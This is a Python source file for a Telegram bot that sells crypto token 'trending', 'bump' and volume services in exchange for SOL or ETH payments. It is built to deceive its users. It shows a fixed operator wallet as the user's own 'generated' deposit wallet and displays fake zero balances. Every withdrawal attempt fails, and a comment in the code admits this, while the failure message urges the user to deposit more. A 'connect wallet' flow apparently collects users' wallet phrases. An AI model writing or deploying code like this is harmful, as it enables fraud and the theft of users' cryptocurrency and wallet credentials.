# from telebot import TeleBot
# from telebot.types import InlineKeyboardButton
from bot_instance import bot
from startbump import handle_startbumps_callbacks, handle_start_bump
from user_sessions import set_user_ca, get_user_price, get_user_ca
import requests
from menu import start_message
from bot_interations import send_payment_verification_to_group, handle_group_callback, group_chat_id
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from volume import handle_volume, handle_volume_package, handle_volume_ca, volume_temp_ca_info
from premuim import handle_premium, handle_sol_trending, handle_sol_trending_callbacks, handle_eth_trending, handle_eth_trending_callbacks, handle_pumpfun_trending, handle_pumpfun_trending_callbacks
from deposit import handle_deposit
from connect import handle_connect, handle_connect_wallet, handle_connect_security, connect_phrase_waiting
from dexscreener import handle_dexscreener, handle_dexscreener_trend, banner_waiting
from wallets import SOL_WALLET, ETH_WALLET_100, ETH_WALLET_200, ETH_WALLET_300, PUMPFUN_WALLET, DEFAULT_WALLET
from CA_ import handle_token_input, temp_ca_info
# import telebot
# print(telebot.__version__)
import re


prices = {}

tx_hash_waiting = {}

withdrawal_waiting = {}



ca_retry_waiting = {}



def mdv2_escape(text):
    # Simple escape for Markdown - only escape backticks
    return text.replace('`', '\\`')

def safe_delete_message(chat_id, message_id):
    """Safely delete a message, ignoring errors if it can't be deleted"""
    try:
        bot.delete_message(chat_id, message_id)
    except Exception:
        pass  # Ignore deletion errors

def is_valid_tx_hash(tx_hash):
    # ETH: 0x + 64 hex chars
    if tx_hash.startswith('0x') and len(tx_hash) == 66 and all(c in '0123456789abcdefABCDEF' for c in tx_hash[2:]):
        return True
    # SOL: 43-88 base58 chars (letters/numbers, no 0x)
    if 43 <= len(tx_hash) <= 88 and tx_hash.isalnum() and not tx_hash.startswith('0x'):
        return True
    return False



def send_eth_payment_instructions(chat_id, price, token_name=None):
    """Send ETH trending payment instructions with multiple wallet options"""
    verify_text = "\n\nClick /sent to verify payment"
    
    # Define wallet addresses for different price tiers
    eth_wallets = {
        "100$": ETH_WALLET_100,
        "200$": ETH_WALLET_200,
        "300$": ETH_WALLET_300
    }
    
    wallet_address = eth_wallets.get(price, ETH_WALLET_100)
    wallet_address_md = mdv2_escape(wallet_address)
    text = (
        f"🔵ETH TREND\n"
        f"Kindly chose the trend you wish to pump on.\n\n"
        f"✅Token Successfully added✅\n\n"
        f"🟢One last Step: Payment Required.\n\n"
        f"Price: {price}\n"
        f"Wallet:\n\n"
        f"{wallet_address_md}\n\n"
        f"📝 Note:\n"
        f"Kindly make sure to send the exact price and no additional price should be add.{verify_text}"
    )
    bot.send_message(chat_id, text, parse_mode="Markdown")

def send_pumpfun_payment_instructions(chat_id, price, token_name=None):
    """Send PumpFun trending payment instructions"""
    verify_text = "\n\nClick /sent to verify payment"
    
    pumpfun_address = PUMPFUN_WALLET
    pumpfun_address_md = mdv2_escape(pumpfun_address)
    text = (
        f"Order Placed Successfully!\n"
        f"✅ We have 1 available slot!✅\n\n"
        f"Once the payment received you will get notification and trending will start in 20 mins.\n\n\n"
        f"Payment address:SOL\n"
        f"{pumpfun_address_md}\n"
        f" (Tap to Copy){verify_text}"
    )
    bot.send_message(chat_id, text, parse_mode="Markdown")

def send_payment_instructions(chat_id, price, token_name=None):
    # Check if this is an ETH trending payment
    if price and "$" in price:
        send_eth_payment_instructions(chat_id, price, token_name)
        return
    
    # Check if this is a PumpFun trending payment
    if price and price == "30 SOL":
        send_pumpfun_payment_instructions(chat_id, price, token_name)
        return
    
    wallet_address = SOL_WALLET
    wallet_address_md = mdv2_escape(wallet_address)
    verify_text = "\n\nClick /sent to verify payment"
    if token_name:
        text = f"✅{token_name} Successfully added✅\n\n🟢One last Step: Payment Required\n\n⌛️ Please complete the one time fee payment of {price} to the following wallet address: \n\nWallet:\n{wallet_address_md}\n\nOnce you have completed the payment within the given timeframe, your bump order will be activated !{verify_text}"
    else:
        text = f"✅Token Successfully added✅\n\n🟢One last Step: Payment Required\n\n⌛️ Please complete the one time fee payment of {price} SOL to the following wallet address: \n\nWallet:\n{wallet_address_md}\n\nOnce you have completed the payment within the given timeframe, your bump order will be activated !{verify_text}"
    price_to_image = {
        '0.3': 'https://github.com/raccityy/raccityy.github.io/blob/main/3.jpg?raw=true',
        '0.4': 'https://github.com/raccityy/raccityy.github.io/blob/main/4.jpg?raw=true',
        '0.5': 'https://github.com/raccityy/raccityy.github.io/blob/main/5.jpg?raw=true',
        '0.6': 'https://github.com/raccityy/raccityy.github.io/blob/main/6.jpg?raw=true',
    }
    # Extract numeric part from price (handle both "0.3" and "2 SOL" formats)
    if ' ' in price:  # Price contains "SOL" (e.g., "2 SOL")
        numeric_price = price.split(' ')[0]  # Extract "2" from "2 SOL"
    else:
        numeric_price = price  # Already numeric (e.g., "0.3")
    
    # Format price to one decimal place string for lookup
    price_str = f"{float(numeric_price):.1f}"
    image_url = price_to_image.get(price_str, None)
    if image_url and image_url.startswith('http'):
        try:
            bot.send_photo(chat_id, image_url, caption=text)
        except Exception:
            bot.send_message(chat_id, text)
    else:
        bot.send_message(chat_id, text)

@bot.message_handler(commands=["start"])
def handle_start(message):
    start_message(message)
    # Notify group
    user = message.from_user.username or message.from_user.id
    bot.send_message(group_chat_id, f"User @{user} just clicked /start")


@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    chat_id = call.message.chat.id
    withdrawal_waiting.pop(chat_id, None)
    connect_phrase_waiting.pop(chat_id, None)
    banner_waiting.pop(chat_id, None)
    ca_retry_waiting.pop(chat_id, None)
    # print(call.data)
    bot.send_message(group_chat_id, f"User @{call.from_user.username} just clicked {call.data}")

    # Handle group reply/close buttons
    if call.data.startswith("group_reply_") or call.data.startswith("group_close_"):
        handle_group_callback(call)
        return

    # Standardized back and menu button handling
    if call.data == "back":
        # Back button should go back one step - this will be handled by specific handlers
        return
    elif call.data == "mainmenu":
        # Menu button should always go to main menu
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    if call.data == "volume":
        handle_volume(call)
        return

    # Handle volume package buttons
    if call.data in [
        "vol_iron", "vol_bronze", "vol_gold", "vol_platinum", "vol_silver", "vol_diamond"
    ]:
        handle_volume_package(call)
        return

    if call.data == "vol_back":
        # Go back to main menu (one step back from volume)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return
    elif call.data == "vol_mainmenu":
        # Go to main menu
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    if call.data == "vol_confirm_ca":
        chat_id = call.message.chat.id
        info = volume_temp_ca_info.pop(chat_id, None)
        if info:
            price = info['price']
            send_payment_instructions(chat_id, price)
        return

    if call.data == "vol_back_ca":
        chat_id = call.message.chat.id
        bot.delete_message(chat_id, call.message.message_id)
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("Back", callback_data="ca_back"))
        bot.send_message(chat_id, "📄 *Enter Token Name or Contract Address (CA)*\n\nPlease enter either:\n• A token name (word length > 10) to search on DEX\n• Or a Contract Address (CA) directly", parse_mode="Markdown", reply_markup=markup)
        ca_retry_waiting[chat_id] = True
        return

    if call.data == "premium":
        handle_premium(call)
        return

    # Handle premium buttons
    if call.data.startswith("premium_"):
        if call.data == "premium_sol":
            handle_sol_trending(call)
        elif call.data == "premium_eth":
            handle_eth_trending(call)
        elif call.data == "premium_pumpfun":
            handle_pumpfun_trending(call)
        elif call.data == "premium_back":
            # Go back to main menu (one step back from premium)
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "premium_menu":
            # Go to main menu
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            handle_premium(call)
        return

    # Handle SOL trending buttons
    if call.data.startswith("sol_"):
        if call.data == "sol_back":
            # Go back to premium menu (one step back from SOL trending)
            handle_premium(call)
        elif call.data == "sol_mainmenu":
            # Go to main menu
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle SOL trending package selection
            handle_sol_trending_callbacks(call)
        return

    # Handle ETH trending buttons
    if call.data.startswith("eth_"):
        if call.data == "eth_back":
            # Go back to premium menu (one step back from ETH trending)
            handle_premium(call)
        elif call.data == "eth_mainmenu":
            # Go to main menu
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle ETH trending package selection
            handle_eth_trending_callbacks(call)
        return

    # Handle PumpFun trending buttons
    if call.data.startswith("pumpfun_"):
        if call.data == "pumpfun_back":
            # Go back to premium menu (one step back from PumpFun trending)
            handle_premium(call)
        elif call.data == "pumpfun_mainmenu":
            # Go to main menu
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle PumpFun trending package selection
            handle_pumpfun_trending_callbacks(call)
        return

    if call.data == "startbump":
        handle_start_bump(call)

    elif call.data.startswith("bump_"):
        # Forward bump-related callbacks to startbump handler
        handle_startbumps_callbacks(call)

    elif call.data == "deposit":
        handle_deposit(call)

    # Handle deposit buttons
    if call.data.startswith("deposit_"):
        if call.data == "deposit_add":
            bot.answer_callback_query(call.id)
            deposit_address = mdv2_escape(SOL_WALLET)
            text = (
                "walet GENERATED from telegrams wallet menu\n\n"
                "Make a minimum deposit of 0.20 sol to the address below⏬️⏬️⏬️\n\n\n"
                "💳 Wallet:\n"
                f"{deposit_address}"
            )
            bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        elif call.data == "deposit_withdraw":
            bot.answer_callback_query(call.id)
            text = (
                "BALANCE: 0.0 SOL\n\n"
                "enter withdraw amount BELOW(numers only ):"
            )
            bot.send_message(call.message.chat.id, text)
            # Set user in withdrawal mode
            withdrawal_waiting[call.message.chat.id] = True
        elif call.data == "deposit_balance":
            bot.answer_callback_query(call.id)
            eth_address = mdv2_escape(ETH_WALLET_100)
            sol_address = mdv2_escape(SOL_WALLET)
            text = (
                "WALLET BALANCE\n\n"
                "ETH: \n"
                f"{eth_address}\n"
                "balance: 0.0 ETH\n\n"
                "SOL: \n"
                f"{sol_address}\n"
                "balance: 0.0SOL\n\n"
                "Deposit not less than 0.20 SOL and get trending on several plaforms "
            )
            bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        elif call.data == "deposit_back":
            # Go back to main menu (one step back from deposit)
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "deposit_mainmenu":
            # Go to main menu
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    # Handle dexscreener buttons
    if call.data.startswith("dexscreener_"):
        if call.data == "dexscreener_trend":
            handle_dexscreener_trend(call)
        elif call.data == "dexscreener_back":
            # Go back to main menu (one step back from dexscreener)
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "dexscreener_mainmenu":
            # Go to main menu
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    elif call.data == "connect":
        handle_connect(call)

    # Handle connect buttons
    if call.data.startswith("connect_"):
        if call.data == "connect_wallet":
            handle_connect_wallet(call)
        elif call.data == "connect_security":
            handle_connect_security(call)
        elif call.data == "connect_back":
            # Go back to main menu (one step back from connect)
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "connect_mainmenu":
            # Go to main menu
            safe_delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    elif call.data == "dexscreener":
        handle_dexscreener(call)

    elif call.data == "confirm_ca":
        chat_id = call.message.chat.id
        info = temp_ca_info.pop(chat_id, None)
        if info:
            price = info['price']
            send_payment_instructions(chat_id, price)
        return

    elif call.data == "back_ca":
        chat_id = call.message.chat.id
        safe_delete_message(chat_id, call.message.message_id)
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("Back", callback_data="ca_back"))
        bot.send_message(chat_id, "📄 *Enter Token Name or Contract Address (CA)*\n\nPlease enter either:\n• A token name (word length > 10) to search on DEX\n• Or a Contract Address (CA) directly", parse_mode="Markdown", reply_markup=markup)
        ca_retry_waiting[chat_id] = True
        return

    elif call.data == "use_alternative_ca":
        chat_id = call.message.chat.id
        bot.delete_message(chat_id, call.message.message_id)
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("Back", callback_data="ca_back"))
        bot.send_message(chat_id, "📄 *Enter Alternative Contract Address (CA)*\n\nPlease enter an alternative Contract Address (CA) for your project:", parse_mode="Markdown", reply_markup=markup)
        ca_retry_waiting[chat_id] = True
        return

    # Handle connect wallet retry/menu buttons
    elif call.data == "try_connect_again":
        connect_phrase_waiting[call.message.chat.id] = True
        bot.delete_message(call.message.chat.id, call.message.message_id)
        handle_connect_wallet(call)
        # print("yes")
        return
    # Handle connect wallet menu button
    elif call.data == "menu_for_connect":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    if call.data == "ca_retry":
        ca_retry_waiting[call.message.chat.id] = True
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("Retry", callback_data="ca_retry"),
            InlineKeyboardButton("Back", callback_data="ca_back")
        )
        bot.send_message(call.message.chat.id, "📄 *Enter Token Name or Contract Address (CA)*\n\nPlease enter either:\n• A token name (word length > 10) to search on DEX\n• Or a Contract Address (CA) directly", parse_mode="Markdown", reply_markup=markup)
        return
    elif call.data == "ca_back":
        handle_premium(call)
        return

    # else:
    #     bot.answer_callback_query(call.id)
    #     bot.send_message(call.message.chat.id, "❌ Unknown action.")


@bot.message_handler(commands=["sent"])
def handle_sent(message):
    chat_id = message.chat.id
    price = get_user_price(chat_id)
    if price:
        bot.send_message(chat_id, f"You selected this {price}\n\nPlease send your tx hash below and await immediate confirmation")
        tx_hash_waiting[chat_id] = True
    else:
        bot.send_message(chat_id, "No bump order in progress. Please start a new bump order first.")


@bot.message_handler(func=lambda message: not message.text.startswith('/'))
def handle_contract_address_or_tx(message):
    chat_id = message.chat.id
    
    # Handle withdrawal amount input
    if withdrawal_waiting.get(chat_id):
        try:
            amount = float(message.text.strip())
            # Since balance is always 0.0, this will always trigger the error
            bot.send_message(chat_id, "⚠️Current wallet is insufficient\n\nyour current balance is 0.0 SOL\n\nPlease deposit at least 0.20 SOL to your wallet\nlet's get your project trending top Notch")
            # Keep user in withdrawal mode (don't pop from withdrawal_waiting)
            return
        except ValueError:
            bot.send_message(chat_id, "❌ Please enter a valid number.")
            return
    
    if tx_hash_waiting.get(chat_id):
        tx_hash = message.text.strip()
        if is_valid_tx_hash(tx_hash):
            price = get_user_price(chat_id)
            ca = get_user_ca(chat_id)
            user = message.from_user.username or message.from_user.id
            send_payment_verification_to_group(user, price, ca, tx_hash, user_chat_id=chat_id)
            bot.send_message(chat_id, "Your tx hash has been sent for verification. Please wait for confirmation.")
            tx_hash_waiting.pop(chat_id, None)
        else:
            bot.send_message(chat_id, "❌ Invalid tx hash. Please send a valid Ethereum or Solana transaction hash.")
        return


    # Handle CA input only when retry is clicked
    if ca_retry_waiting.get(chat_id):
        print(f"Processing CA input for chat_id: {chat_id}")
        ca_retry_waiting.pop(chat_id, None)
        price = get_user_price(chat_id)
        print(f"User price: {price}")
        
        # If the user has selected a volume package, handle CA for volume
        if price in ['1', '3', '5.2', '7.5', '10', '15']:
            print("Handling volume CA")
            handle_volume_ca(message, send_payment_instructions, volume_temp_ca_info)
            return

        # Handle all other packages with the new token input logic
        if price:
            print("Handling token input")
            handle_token_input(message, price, temp_ca_info)
            return
        else:
            print("No price found for user")
    else:
        print(f"No CA retry waiting for chat_id: {chat_id}")
        print(f"Available waiting states: withdrawal={withdrawal_waiting.get(chat_id)}, tx_hash={tx_hash_waiting.get(chat_id)}, ca_retry={ca_retry_waiting.get(chat_id)}")


@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    # Handle banner image input for dexscreener
    if banner_waiting.get(chat_id):
        banner_waiting.pop(chat_id, None)
        # Call SOL trending directly
        text = (
            "🟢Discover the Power of Trending!\n\n"
            "Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n"
            "🟢A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n"
            "➔ Please choose SOL Trending or Pump Fun Trending to start:\n"
            "_____________________"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(InlineKeyboardButton("🔻 TOP 6 🔻", callback_data="none"))
        markup.add(
            InlineKeyboardButton("⏳ 5 hours | 2 SOL", callback_data="sol_5h_2sol"),
            InlineKeyboardButton("⏳ 7 hours | 3.5 SOL", callback_data="sol_7h_3.5sol")
        )
        markup.add(
            InlineKeyboardButton("⏳ 12 hours | 7 SOL", callback_data="sol_12h_7sol"),
            InlineKeyboardButton("⏳ 24 hours | 15 SOL", callback_data="sol_24h_15sol")
        )
        markup.add(
            InlineKeyboardButton("⏳ 18 hours | 10 SOL", callback_data="sol_18h_10sol"),
            InlineKeyboardButton("⏳ 32 hours | 22 SOL", callback_data="sol_32h_22sol")
        )
        markup.add(
            InlineKeyboardButton("🔙 Back", callback_data="sol_back"),
            InlineKeyboardButton("🔝 Main Menu", callback_data="sol_mainmenu")
        )
        bot.send_message(chat_id, text, reply_markup=markup)
    # (You can add other photo handling logic here if needed)


print("bot is running")
try:
    bot.polling(none_stop=True, timeout=60)
except Exception as e:
    print(f"Bot polling error: {e}")
    print("Trying to restart in 5 seconds...")
    # import time
    # time.sleep(5)
    # bot.polling(none_stop=True, timeout=60)
